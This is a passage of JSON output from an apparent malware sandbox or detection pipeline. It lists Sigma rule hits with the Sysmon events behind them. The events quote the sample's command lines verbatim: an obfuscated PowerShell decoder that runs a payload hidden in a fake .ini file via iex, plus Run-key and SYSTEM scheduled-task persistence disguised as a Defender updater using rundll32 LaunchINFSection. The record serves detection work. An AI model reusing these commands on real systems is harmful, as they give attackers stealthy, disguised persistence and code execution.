                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=2052; EventType=SetValue; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; RuleName=T1060,RunKey; UtcTime=1701126043; Details=c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,; ProcessGuid={C784477D-1F5A-6565-5806-000000004800}; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\7A002242-98C7-C640-DF13-F92F76F77DF9}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "8b5db9da5732dc549b0e8b56fe5933d7c95ed760f3ac20568ab95347ef8c5bcc",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "CurrentVersion Autorun Keys Modification",
                                                                       "rule_description":  "Detects modification of autostart extensibility point (ASEP) in registry.",
                                                                       "rule_author":  "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F94-6565-5A06-000000004800}; ProcessId=5864; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-1F52-6565-5506-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=1848; CurrentDirectory=C:\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsDefenderUpdater /TR \"c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\" /F; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; UtcTime=1701126036; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F9B-6565-5B06-000000004800}; ProcessId=3488; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-1F5A-6565-5806-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=2052; CurrentDirectory=C:\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsDefenderUpdater /TR \"c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\" /F; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; UtcTime=1701126043; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "e36b579d4bc4ef49ede1d82dd08ec1cba660d105c6f037d12ecf79b434617e88",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Schtasks Schedule Type With High Privileges",
                                                                       "rule_description":  "Detects scheduled task creations or modification to be run with high privileges on a suspicious schedule type",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F52-6565-5506-000000004800}; ProcessId=1848; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701125970; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F5A-6565-5806-000000004800}; ProcessId=2052; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701125978; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F9E-6565-5D06-000000004800}; ProcessId=7116; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701126046; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1FA6-6565-6006-000000004800}; ProcessId=1952; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701126054; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "157d3e7415430b97001871f8aecb592075581e05187450141e56c252318f2b26",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potential Encoded PowerShell Patterns In CommandLine",
                                                                       "rule_description":  "Detects specific combinations of encoding methods in PowerShell via the commandline",
                                                                       "rule_author":  "Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F52-6565-5506-000000004800}; ProcessId=1848; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701125970; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F5A-6565-5806-000000004800}; ProcessId=2052; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701125978; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F9E-6565-5D06-000000004800}; ProcessId=7116; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701126046; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1FA6-6565-6006-000000004800}; ProcessId=1952; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701126054; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "1c2e4db94ca79f939e94e29c04fb3b71467fc6f5b9c31db34fcce5a2fb3b856f",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Non Interactive PowerShell Process Spawned",
                                                                       "rule_description":  "Detects non-interactive PowerShell activity by looking at the \"powershell\" process with a non-user GUI process such as \"explorer.exe\" as a parent.",
                                                                       "rule_author":  "Roberto Rodriguez @Cyb3rWard0g (rule), oscd.community (improvements)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F94-6565-5A06-000000004800}; ProcessId=5864; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-1F52-6565-5506-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=1848; CurrentDirectory=C:\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsDefenderUpdater /TR \"c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\" /F; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; UtcTime=1701126036; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F9B-6565-5B06-000000004800}; ProcessId=3488; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-1F5A-6565-5806-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=2052; CurrentDirectory=C:\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsDefenderUpdater /TR \"c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\" /F; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; UtcTime=1701126043; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "3bc9d14114a6b67367a24df21134d0564d6f08a0ad903d68f9b25e9d8b7f0790",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Scheduled Task Creation",
                                                                       "rule_description":  "Detects the creation of scheduled tasks in user session",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=1848; DestinationPortName=domain; Protocol=udp; DestinationIp=808:808:fb1:4b3c:75ec:488b:4b18:e81d; Initiated=true; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-1F52-6565-5506-000000004800}; DestinationHostname=-; UtcTime=1698181566; User=DESKTOP-B0T93D6\\george; DestinationPort=53; RuleName=-; SourcePort=51022; SourceIsIpv6=true; SourceHostname=-; SourceIp=c0a8:21a:6e6b:2000:f880:a333:8eb9:ffff; DestinationIsIpv6=true}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=1848; DestinationPortName=https; Protocol=tcp; Initiated=true; DestinationIp=104.237.62.212; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-1F52-6565-5506-000000004800}; DestinationHostname=api.ipify.org; UtcTime=1698181567; User=DESKTOP-B0T93D6\\george; DestinationPort=443; RuleName=-; SourcePort=49744; SourceIsIpv6=false; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.26; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=1848; DestinationPortName=https; Protocol=tcp; DestinationIp=104.237.62.212; Initiated=true; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-1F52-6565-5506-000000004800}; DestinationHostname=api.ipify.org; UtcTime=1698181573; User=DESKTOP-B0T93D6\\george; DestinationPort=443; RuleName=-; SourcePort=49745; SourceIsIpv6=false; DestinationIsIpv6=false; SourceIp=192.168.2.26; SourceHostname=DESKTOP-B0T93D6.local}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=2052; DestinationPortName=domain; Protocol=udp; DestinationIp=808:808:fb1:4b3c:75ec:488b:4b18:e81d; Initiated=true; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-1F5A-6565-5806-000000004800}; DestinationHostname=-; UtcTime=1698181574; User=DESKTOP-B0T93D6\\george; DestinationPort=53; RuleName=-; SourcePort=61618; SourceIsIpv6=true; DestinationIsIpv6=true; SourceIp=c0a8:21a:6e6b:2000:f880:a333:8eb9:ffff; SourceHostname=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=2052; DestinationPortName=https; SourceIsIpv6=false; Initiated=true; DestinationIp=64.185.227.156; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-1F5A-6565-5806-000000004800}; DestinationHostname=api.ipify.org; UtcTime=1698181574; User=DESKTOP-B0T93D6\\george; DestinationPort=443; RuleName=-; SourcePort=49746; Protocol=tcp; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.26; DestinationIsIpv6=false}"
                                                                                             },
